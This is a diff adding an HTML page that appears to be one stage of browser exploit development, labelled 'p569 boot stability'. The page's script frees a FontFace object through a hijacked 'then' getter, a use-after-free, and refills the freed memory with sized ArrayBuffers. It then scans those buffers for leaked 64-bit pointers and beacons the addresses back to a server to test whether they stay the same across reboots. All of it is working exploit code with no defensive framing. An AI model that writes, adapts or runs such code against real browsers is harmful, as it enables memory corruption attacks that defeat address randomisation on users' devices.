@@ -1,0 +1,103 @@
+<!--
+  p569: Boot stability test — minimal leak, p566-compatible getter
+
+  Single-stage UAF + reclaim. Reports p58/p68 only.
+  Run once per cold boot to measure whether load-1 p58 is byte-identical
+  across reboots (cobrajet302gt found 0x10001cb0d0 on 5 consecutive boots).
+
+  Uses p566's proven getter pattern (no styleEl.textContent='', K=16, markers).
+
+  CRASH_CLASS: LOW — identical to p566
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p569 boot stability</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+var K = 16, SIZE = 192, styleEl = null, firedHere = false, scanDone = false;
+
+function hex8be(v, off) {
+  var s = '';
+  for (var i = 7; i >= 0; i--) s += ('0' + v[off + i].toString(16)).slice(-2);
+  return s;
+}
+
+function addr64(v, off) {
+  var lo = (v[off] | (v[off+1] << 8) | (v[off+2] << 16) | ((v[off+3] << 24) >>> 0)) >>> 0;
+  var hi = (v[off+4] | (v[off+5] << 8) | (v[off+6] << 16) | ((v[off+7] << 24) >>> 0)) >>> 0;
+  return hi * 0x100000000 + lo;
+}
+
+function setupFace() {
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = [A];
+}
+
+function installGetter() {
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      styleEl = null;
+      document.body.offsetHeight;
+
+      window.__bufs = [];
+      for (var k = 0; k < K; k++) {
+        var ab = new ArrayBuffer(SIZE);
+        var v = new Uint8Array(ab);
+        v[0x10] = 0xBB;
+        v[0x11] = 0xAA;
+        v[0x12] = k & 0xFF;
+        window.__bufs.push(v);
+      }
+      try { document.fonts.check('1em s0'); } catch(e) {}
+      return undefined;
+    },
+    set: function() {}
+  });
+}
+
+function doScan() {
+  if (scanDone) return;
+  var bufs = window.__bufs || [];
+  for (var i = 0; i < bufs.length; i++) {
+    var v = bufs[i];
+    if (v[0x58] !== 0 || v[0x59] !== 0 || v[0x5A] !== 0 || v[0x5B] !== 0) {
+      scanDone = true;
+      var p58 = addr64(v, 0x58);
+      b('P569-HIT-b' + i
+        + '-p58_' + hex8be(v, 0x58)
+        + '-p68_' + hex8be(v, 0x68)
+        + '-m32k_' + (p58 % 32768).toString(16)
+        + '-rc_' + v[0]);
+      b('P569-DONE');
+      return;
+    }
+  }
+}
+
+function start() {
+  setupFace();
+  installGetter();
+  b('P569-BOOT');
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function() { b('P569-OK'); },
+    function() { b('P569-FAIL'); }
+  );
+  setTimeout(doScan, 80);
+  setTimeout(doScan, 250);
+  setTimeout(doScan, 500);
+  setTimeout(function() { if (!scanDone) b('P569-NOHIT'); }, 600);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(start, 0);
+else document.addEventListener('DOMContentLoaded', start);
+</script></head><body><p>p569 boot stability</p></body></html>
